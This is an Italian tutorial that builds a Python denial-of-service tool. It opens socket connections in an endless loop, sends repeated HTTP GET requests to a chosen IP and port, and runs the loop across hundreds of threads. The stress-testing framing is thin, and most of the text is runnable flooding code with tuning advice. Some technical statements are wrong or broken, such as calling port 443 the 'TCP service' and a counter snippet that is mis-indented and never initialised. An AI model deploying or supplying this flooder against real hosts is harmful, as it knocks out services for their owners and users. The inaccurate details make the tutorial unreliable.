# Cos'è un attacco DoS
Un attacco DoS (letteralmente Denial of Service) è un attacco, solitamente eseguito in modo illegale, il cui scopo e' saturare le risorse di un servizio o di un sistema inondandolo di richieste fino all'esaurimento delle risorse o sfruttando bug software. Questo tipo di attacco viene spesso eseguito con l'aiuto delle cosiddette botnet (reti di pc infettati che fungono da dispositivi per il DDoS, letteralmente Distributed Denial of Service) per soddisfare la necessita' di generare grandi quantita' di traffico.

# Tipi di attacchi Dos/DDoS
Come potete vedere nell'immagine sottostante, esistono ben 14 tipi di attacchi DoS/DDoS; quello che interessa a noi sarà l'attacco HTTP Flood.
![image](https://user-images.githubusercontent.com/82817793/194537095-87295829-3023-46e2-910d-d9e0ddc6daed.png)

# DoS e DDoS nel Pentesting
Gli attacchi DoS e DDoS vengono usati principalmente nel Penetration Testing per eseguire degli stress-test su dei webserver o dei siti web. Gli stress-test sono una forma di test deliberatamente intensi o approfonditi utilizzati per determinare la stabilità di un determinato sistema, infrastruttura critica o entità.
# E ora, iniziamo a programmare!
L'implentazione di uno script DoS in Python è abbastanza semplice. Abbiamo solo bisogno di inviare richieste HTTP GET a un host su una porta specifica, più e più volte. Questo può essere fatto con le sockets, libreria built-in di Python. Per accelerare il processo e renderlo più efficace, utilizzeremo anche il multi-threading, che permette di eseguire comandi su più istanze dello stesso processo, rendendo così possibile l'esecuzione di più comandi al secondo. Perciò, le seguenti librerie saranno necessarie e, quindi, da importare:
```python
import socket
import threading
```
Ora le primissime cose di cui avremo bisogno sono l'indirizzo IP del nostro bersaglio, la porta che vogliamo attaccare, il numero di threads e il nostro caro indirizzo IP "falso" che vogliamo utilizzare. Tenete conto che questo tipo di indirizzo IP "falso" non nasconde davvero chi siamo, nè ci rende anonimi; serve solo appunto come indirizzo IP "di partenza" per inviare le richieste HTTP GET.
```python
target = str(input("Inserisci IP Target: "))
port = int(input("Inserisci Porta: "))
Trd = int(input("Inserisci Numero Di Threads: "))
fake_ip = '44.197.175.168'
```
Come potete vedere sopra, sia per il target che per la porta e il numero di threads, andiamo a inserire rispettivamente un input di tipo stringa (testuale) e 2 input di tipo integer (numerico), in modo da lasciare all'utilizzatore del nostro tool, una libertà nella scelta di essi, direttamente mentre usa il tool.
Come ho già detto, la pratica del DoSsing è illegale (tranne appunto nel caso del Pentesting), quindi fate attenzione all'obiettivo che sceglierete di attaccare (consiglio di fare una prova di attacco su un vostro sito web). Come indirizzo IP "falso" ho scelto l'indirizzo dei una mia personale istanza EC2 su AWS, usata come webserver. Ultima cosa, ma non per importanza, consiglio di attaccare la porta 80, che è quella HTTP.
Se si desidera arrestare un servizio specifico, è necessario sapere a quale porta sta operando (ad esempio la porta 443 di un sito web, è quella del servizio TCP, l'80 quella HTTP, e così via). La prossima cosa che dobbiamo fare è implementare l'effettiva funzione di attacco.
```python
def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        s.close()
```
Questa funzione di attacco è la funzione che verrà eseguita in ciascuno dei nostri singoli thread. Il codice ```while True``` avvia un loop infinito, all'interno del quale crea una socket, si connette alla destinazione e invia una richiesta HTTP più e più volte. Naturalmente, se andiamo ad attaccare un'altra porta, dovremo anche cambiare il tipo di richiesta che inviamo.
Nel codice soprastante potete vedere che creiamo la funzione ```attack()```.
Il contenuto della funzione è il seguente:
* Ci connettiamo all'indirizzo IP e alla porta del nostro bersaglio;
* Creiamo delle richieste HTTP GET codificate in ASCII che andiamo ad inviare, ripetutamente, al nostro bersaglio.
Ora l'ultima cosa che dobbiamo fare è eseguire più thread che, a loro volta, eseguono questa funzione contemporaneamente. Se eseguissimo semplicemente la funzione (senza multi-threading) invierebbe molte richieste più e più volte, ma sarebbero inviate solo una dopo l'altra. Utilizzando il multi-threading, possiamo inviare molte richieste contemporaneamente.
```python
for i in range(Trd):
    thread = threading.Thread(target=attack)
    thread.start()
```
In questo caso, scegliamo di avviare 500 threads che eseguiranno la nostra funzione. Ovviamente possiamo "giocare" con questo numero, scegliendone uno diverso nell'input che abbiamo visto all'inizio (ma io consiglio di usarne 500). Quando ora eseguiamo il nostro script, il DoSsing avviene già, ma se desideriamo visualizzare ulteriori informazioni, è possibile stampare la quantità di richieste già inviate (questo processo rallenterà di un pochino il nostro attacco, ma non abbastanza da renderlo inefficace).
```python
global attack_num
        attack_num += 1
        print(attack_num)
```
Per abbellire un po il nostro script, andremo ad utilizzare toilet, un pacchetto open-source per stampare testo. Per eseguire i comandi di toilet (comandi che sono scritti in bash), dovremo importare la libreria os.
```python
import os
```
Infine andremo ad eseguire il comando ```toilet NomeDelTool``` tramite il seguente codice, che andremo ad aggiungere all'inizio del nostro script:
```python
os.system("clear") # Comando per pulire il terminale dal testo precedente
os.system("toilet NomeDelTool") # os.system("comando in bash") permette all'os di eseguire il comando specificato nella Shell dove stiamo usando il tool
```
Questa lezione termina qui ragazzi, spero che l'abbiate apprezzata e che abbiate imparato qualcosa di nuovo. Alla prossima!
# I miei social
[![Linkedin Badge](https://img.shields.io/badge/-TommasoBona-blue?style=flat-square&logo=Linkedin&logoColor=white&link=https://www.linkedin.com/in/tommaso-bona-20b76b232)](https://www.linkedin.com/in/tommaso-bona-20b76b232)
[![Instagram Badge](https://img.shields.io/badge/-TommasoBona-purple?style=flat-square&logo=instagram&logoColor=white&link=https://instagram.com/tommasoobona/)](https://instagram.com/tommasoobona)
[![Gmail Badge](https://img.shields.io/badge/-tommasobona04@gmail.com-c14438?style=flat-square&logo=Gmail&logoColor=white&link=mailto:tommasobona04@gmail.com)](mailto:tommasobona04@gmail.com)
# Articolo di
Tommaso Bona, © 2023 SecurityCert
<div id="header" align="center"> 

   <img src="https://media.giphy.com/media/YRMb6dd7zprS00JdGZ/giphy.gif" width="100"/> 

 </div>
